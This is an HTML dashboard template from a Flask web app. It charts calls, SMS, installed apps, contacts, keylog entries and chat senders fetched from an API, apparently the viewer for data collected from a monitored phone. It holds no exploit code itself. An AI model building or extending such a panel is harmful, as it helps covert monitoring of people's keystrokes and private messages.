<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Visualization</title>
    <link rel="stylesheet" href="https://cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-datalabels@2.0.0"></script>
    <style>
        body {
            transition: background-color 0.5s ease, color 0.5s ease;
        }
        .card {
            transition: background-color 0.5s ease, box-shadow 0.5s ease;
        }
        .chart-container {
            position: relative;
            height: 300px;
            width: 100%;
        }
        .chart-placeholder {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            font-size: 1.2rem;
            border-radius: 0.25rem;
        }
        .summary-stats {
            border-radius: 0.25rem;
            padding: 10px;
            margin-bottom: 20px;
        }
        #dark-mode-toggle {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            transition: transform 0.3s ease;
        }
        #dark-mode-toggle:hover {
            transform: rotate(180deg);
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        .toast {
            transition: opacity 0.3s ease, transform 0.3s ease;
            opacity: 0;
            transform: translateY(-20px);
        }
        .toast.show {
            opacity: 1;
            transform: translateY(0);
        }
    </style>
</head>
<body data-bs-theme="dark">
    <div id="dark-mode-toggle">
        <button class="btn btn-outline-secondary" onclick="toggleDarkMode()">
            <i class="material-icons">brightness_medium</i>
        </button>
    </div>
    <div class="container mt-5">
        <h1 class="mb-4">Data Visualization</h1>
        <a href="{{ url_for('upload_file') }}" class="btn btn-outline-primary mb-3">
            <i class="material-icons align-middle">arrow_back</i> Back to Upload
        </a>
        
        <div class="row mb-4">
            <div class="col-md-6">
                <label for="dateRange" class="form-label">Date Range:</label>
                <select id="dateRange" class="form-select">
                    <option value="all">All Time</option>
                    <option value="last7">Last 7 Days</option>
                    <option value="last30">Last 30 Days</option>
                    <option value="last90">Last 90 Days</option>
                </select>
            </div>
        </div>

        <div id="charts-container" class="row">
            <!-- Charts will be dynamically inserted here -->
        </div>
    </div>

    <div class="toast-container"></div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const categories = ['calls', 'sms', 'applications', 'contacts', 'keylogs', 'chats'];
        const chartTypes = {
            'calls': 'pie',
            'sms': 'pie',
            'applications': 'bar',
            'contacts': 'pie',
            'keylogs': 'bar',
            'chats': 'bar'
        };
        const categoryDescriptions = {
            'calls': 'Distribution of call types',
            'sms': 'Distribution of SMS types',
            'applications': 'Top 10 installed applications',
            'contacts': 'Contacts with and without email',
            'keylogs': 'Top 10 applications with keylog entries',
            'chats': 'Top 10 chat senders'
        };

        let charts = {};

        function toggleDarkMode() {
            const body = document.body;
            const newTheme = body.getAttribute('data-bs-theme') === 'dark' ? 'light' : 'dark';
            body.setAttribute('data-bs-theme', newTheme);
            
            fetch('/toggle_dark_mode', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ theme: newTheme }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    console.log('Dark mode preference saved');
                    showToast('Theme changed', `Switched to ${newTheme} mode`);
                }
            })
            .catch((error) => {
                console.error('Error:', error);
                showToast('Error', 'Failed to save theme preference', 'danger');
            });
        }

        function showToast(title, message, type = 'success') {
            const toastContainer = document.querySelector('.toast-container');
            const toast = document.createElement('div');
            toast.className = `toast align-items-center text-white bg-${type} border-0`;
            toast.setAttribute('role', 'alert');
            toast.setAttribute('aria-live', 'assertive');
            toast.setAttribute('aria-atomic', 'true');
            
            toast.innerHTML = `
                <div class="d-flex">
                    <div class="toast-body">
                        <strong>${title}</strong><br>${message}
                    </div>
                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
                </div>
            `;
            
            toastContainer.appendChild(toast);
            const bsToast = new bootstrap.Toast(toast);
            bsToast.show();
            
            toast.addEventListener('hidden.bs.toast', () => {
                toastContainer.removeChild(toast);
            });
        }

        function createChartCard(category) {
            const card = document.createElement('div');
            card.className = 'col-md-6 mb-4';
            card.innerHTML = `
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">${category.charAt(0).toUpperCase() + category.slice(1)}</h5>
                        <div class="summary-stats" id="${category}Summary"></div>
                        <div class="mb-3">
                            <label for="${category}ChartType" class="form-label">Chart Type:</label>
                            <select id="${category}ChartType" class="form-select chart-type-select">
                                <option value="pie">Pie</option>
                                <option value="bar">Bar</option>
                                <option value="line">Line</option>
                            </select>
                        </div>
                        ${['applications', 'contacts'].includes(category) ? `
                        <div class="mb-3">
                            <input type="text" class="form-control search-input" placeholder="Search ${category}..." data-category="${category}">
                        </div>
                        ` : ''}
                        <div class="chart-container">
                            <div id="${category}ChartPlaceholder" class="chart-placeholder">Loading...</div>
                            <canvas id="${category}Chart"></canvas>
                        </div>
                        <button class="btn btn-outline-secondary download-data mt-3" data-category="${category}">
                            <i class="material-icons align-middle">download</i> Download Data
                        </button>
                    </div>
                </div>
            `;
            return card;
        }

        function createChart(category, data, chartType) {
            const ctx = document.getElementById(`${category}Chart`).getContext('2d');
            const placeholderElement = document.getElementById(`${category}ChartPlaceholder`);
            placeholderElement.style.display = 'none';
            
            if (charts[category]) {
                charts[category].destroy();
            }

            charts[category] = new Chart(ctx, {
                type: chartType,
                data: {
                    labels: data.labels,
                    datasets: [{
                        label: category,
                        data: data.data,
                        backgroundColor: [
                            'rgba(255, 99, 132, 0.8)',
                            'rgba(54, 162, 235, 0.8)',
                            'rgba(255, 206, 86, 0.8)',
                            'rgba(75, 192, 192, 0.8)',
                            'rgba(153, 102, 255, 0.8)',
                            'rgba(255, 159, 64, 0.8)'
                        ],
                        borderColor: 'rgba(255, 255, 255, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'top',
                        },
                        title: {
                            display: true,
                            text: `${category.charAt(0).toUpperCase() + category.slice(1)} Data`
                        },
                        tooltip: {
                            callbacks: {
                                title: function(context) {
                                    return categoryDescriptions[category];
                                }
                            }
                        },
                        datalabels: {
                            color: '#fff',
                            anchor: 'end',
                            align: 'start',
                            offset: 6,
                            font: {
                                weight: 'bold'
                            }
                        }
                    }
                },
                plugins: [ChartDataLabels]
            });
        }

        function loadChart(category, dateRange = 'all', search = '') {
            const placeholderElement = document.getElementById(`${category}ChartPlaceholder`);
            placeholderElement.style.display = 'flex';
            placeholderElement.textContent = 'Loading...';

            fetch(`/api/data/${category}?date_range=${dateRange}&search=${search}`)
                .then(response => response.json())
                .then(data => {
                    createChart(category, data, chartTypes[category]);
                    updateSummaryStats(category, data);
                    placeholderElement.style.display = 'none';
                })
                .catch(error => {
                    console.error(`Error loading ${category} data:`, error);
                    placeholderElement.textContent = 'Error loading data';
                });
        }

        function updateSummaryStats(category, data) {
            const summaryElement = document.getElementById(`${category}Summary`);
            const total = data.data.reduce((a, b) => a + b, 0);
            const max = Math.max(...data.data);
            const maxLabel = data.labels[data.data.indexOf(max)];
            
            summaryElement.innerHTML = `
                <p><strong>Total:</strong> ${total}</p>
                <p><strong>Most Common:</strong> ${maxLabel} (${max})</p>
            `;
        }

        function downloadCSV(category) {
            const chart = charts[category];
            const csvContent = "data:text/csv;charset=utf-8," 
                + chart.data.labels.join(",") + "\n"
                + chart.data.datasets[0].data.join(",");
            const encodedUri = encodeURI(csvContent);
            const link = document.createElement("a");
            link.setAttribute("href", encodedUri);
            link.setAttribute("download", `${category}_data.csv`);
            document.body.appendChild(link);
            link.click();
        }

        document.addEventListener('DOMContentLoaded', function() {
            const chartsContainer = document.getElementById('charts-container');
            const dateRangeSelect = document.getElementById('dateRange');

            categories.forEach(category => {
                const card = createChartCard(category);
                chartsContainer.appendChild(card);
                loadChart(category);
            });

            dateRangeSelect.addEventListener('change', function() {
                categories.forEach(category => {
                    loadChart(category, this.value);
                });
            });

            chartsContainer.addEventListener('change', function(event) {
                if (event.target.classList.contains('chart-type-select')) {
                    const category = event.target.id.replace('ChartType', '');
                    const data = charts[category].data;
                    createChart(category, data, event.target.value);
                }
            });

            chartsContainer.addEventListener('input', function(event) {
                if (event.target.classList.contains('search-input')) {
                    const category = event.target.dataset.category;
                    loadChart(category, dateRangeSelect.value, event.target.value);
                }
            });

            chartsContainer.addEventListener('click', function(event) {
                if (event.target.classList.contains('download-data') || event.target.closest('.download-data')) {
                    const button = event.target.classList.contains('download-data') ? event.target : event.target.closest('.download-data');
                    const category = button.dataset.category;
                    downloadCSV(category);
                }
            });
        });
    </script>
</body>
</html>
